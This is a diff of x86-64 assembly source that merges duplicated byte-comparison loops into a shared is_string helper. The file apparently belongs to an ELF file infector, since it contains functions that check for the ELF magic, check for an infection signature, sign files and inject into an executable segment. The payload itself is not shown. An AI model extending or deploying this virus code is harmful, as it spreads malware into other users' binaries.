@@ -334,25 +334,10 @@ treat_file:
 ; int is_elf_64(char const *file_map);
 ; rax is_elf_64(rdi file_map);
 is_elf_64:
-	mov rsi, 0					; counter = 0;
-	.begin_magic_loop:				; while (true) {
-		mov al, [rdi + rsi]			; 	_c = file_map[counter];
-		lea r8, [rel elf_64_magic]
-		mov bl, [r8+rsi]				; 	_magic_c = elf_64_magic[counter];
-		cmp al, bl				; 	if (_c != _magic_c)
-		jne .end_not_equal			; 		goto end_not_equal;
-		inc rsi					; 	counter++;
-		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
-		je .end_equal				; 		goto end_equal;
-		jmp .begin_magic_loop			; }
-	
-	.end_not_equal:
-		xor rax, rax				; return 0;
-		ret
-
-	.end_equal:
-		mov rax, 1				; return 1;
-		ret
+	lea rsi, [elf_64_magic]				; return is_string(file_map, elf_64_magic, len_elf_64_magic)
+	mov rdx, len_elf_64_magic			; ...
+	call is_string					; ...
+	ret						; ...
 
 ;elf64_phdr *find_exec_segment(char const *_file_map)
 ;rax find_exec_segment(rdi file_map);
@@ -440,22 +425,29 @@ has_signature:
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += size;
 
-	mov rsi, 0					; counter = 0;
-	.begin_signature_loop:				; while (true) {
-		mov al, [rdi + rsi]			; 	_c = file_map[counter];
-		lea r8, [rel signature]
-		mov bl, [r8 + rsi]			; 	_signature_c = signature[counter];
-		cmp al, bl				; 	if (_c != _signature_c)
+	lea rsi, [rel signature]			; return is_string(file_map, signature, len_signature)
+	mov rdx, len_signature				; ...
+	call is_string					; ...
+	ret						; ...
+
+; int is_string(char const *buffer, char const *value, size_t length)
+; rax is_string(rdi buffer, rsi value, rdx length);
+is_string:
+	mov r8, 0					; counter = 0;
+	.begin_string_loop:				; while (true) {
+		mov al, [rdi + r8]			; 	_c = buffer[counter];
+		mov bl, [rsi + r8]			; 	_value_c = value[counter];
+		cmp al, bl				; 	if (_c != _value_c)
 		jne .end_not_equal			; 		goto end_not_equal;
-		inc rsi					; 	counter++;
-		cmp rsi, len_signature			; 	if (counter == len_signature)
+		inc r8					; 	counter++;
+		cmp r8, rdx				; 	if (counter == length)
 		je .end_equal				; 		goto end_equal;
-		jmp .begin_signature_loop			; }
+		jmp .begin_string_loop			; }
 	
 	.end_not_equal:
 		xor rax, rax				; return 0;
 		ret
-
+	
 	.end_equal:
 		mov rax, 1				; return 1;
 		ret
@@ -484,6 +476,8 @@ sign:
 	
 	.end:
 		ret
+
+
 ; void inject(char const *file_map, elf64_phdr *exec_segment)
 ; void inject(rdi file_map, rsi exec_segment);
 inject:
